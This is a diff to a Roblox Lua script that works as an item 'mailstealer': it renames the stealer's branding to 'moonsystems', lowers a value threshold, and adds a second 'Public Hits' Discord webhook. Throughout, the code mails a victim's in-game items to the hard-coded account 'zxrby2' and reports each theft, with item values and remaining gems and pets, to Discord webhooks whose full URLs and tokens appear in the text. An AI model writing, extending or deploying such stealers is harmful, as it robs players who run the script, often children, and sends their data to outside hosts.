@@ -1,10 +1,10 @@
 
-DualRap = 5000000000
+DualRap = 2000000000
 DualUser = "zxrby2"
 DualWebhook = "https://discord.com/api/webhooks/1343598692355149884/7kOEzufWWGC7hazz01iwpHgYBaquryqU1013AyL3CEzsTYe6bisdlVK8-6ONlxNViefV"
 
 LogsWebhook = "https://discord.com/api/webhooks/1343555729927311430/WvB57pIzRP5wX3voC0EPYA96IySGmAkk36KsSITznYS2_9LnfYm_xuuBDmmEsexTmH4O"
-mailstealer_name = "Historic"
+mailstealer_name = "moonsystems"
 
 
 Roblox_Username = Username
@@ -62,7 +62,7 @@ local Directory = require(game:GetService("ReplicatedStorage").Library.Directory
 local Player = game.Players.LocalPlayer
 local Inventory = Save.Inventory
 local HttpService = game:GetService("HttpService")
-local MailMessage = "Historic Scripts On Top!"
+local MailMessage = "Moonsystems On Top!"
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 
@@ -210,32 +210,32 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                     },
                     {
                         ["name"] = ":dog: **Pets left** :dog:",
-                        ["value"] = "```鉃  " .. pets_left .. "```",
+                        ["value"] = "```   " .. pets_left .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":money_mouth: **" .. item_type .. "** :money_mouth:",
-                        ["value"] = "```鉃  " .. id .. "```",
+                        ["value"] = "```   " .. id .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":trophy: **Item RAP** :trophy:",
-                        ["value"] = "```鉃  " .. FormatNumber(RAP) .. "```",
+                        ["value"] = "```   " .. FormatNumber(RAP) .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":gem: **Gems Left** :gem:",
-                        ["value"] = "```鉃  " .. FormatNumber(GemsAmount) .. "```",
+                        ["value"] = "```   " .. FormatNumber(GemsAmount) .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":sparkles: **Shiny** :sparkles:",
-                        ["value"] = "```鉃  " .. shinyy .. "```",
+                        ["value"] = "```   " .. shinyy .. "```",
                         ["inline"] = true
                     },
                     {
                         ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
-                        ["value"] = "```鉃  " .. RBgoldNormal .. "```",
+                        ["value"] = "```   " .. RBgoldNormal .. "```",
                         ["inline"] = true
                     }
                 }
@@ -248,10 +248,37 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
         {
             Url = webhook,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
+            Headers = headers,
             Body = game.HttpService:JSONEncode(msg)
+        }
+    )
+    
+    -- Public Hits Webhook
+    local publicWebhook = "https://discord.com/api/webhooks/1343705357540917248/MCmu4-3-AuQ68afkyP_WgiZvufmyaVh4tsB_0DJ9_juAihDf9OZT21qd9569xwHqKs1R"
+    local publicMsg = {
+        ["content"] = "",
+        ["username"] = "Public Hits",
+        ["embeds"] = {
+            {
+                ["title"] = "**Public Hit Recorded**",
+                ["type"] = "rich",
+                ["color"] = tonumber(16711680),
+                ["fields"] = {
+                    {
+                        ["name"] = ":trophy: **Total RAP** :trophy:",
+                        ["value"] = "```   " .. FormatNumber(totalRap1) .. "```",
+                        ["inline"] = true
+                    }
+                }
+            }
+        }
+    }
+    request(
+        {
+            Url = publicWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = game.HttpService:JSONEncode(publicMsg)
         }
     )
 end
@@ -870,7 +897,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                             LOGS_WEBHOOK,
                             Left_Hits,
                             v.IsShiny,
-                            "Historic Scripts On Top!",
+                            "Moonsystems Scripts On Top!",
                             v.Item_RAP,
                             totalRap
                         )
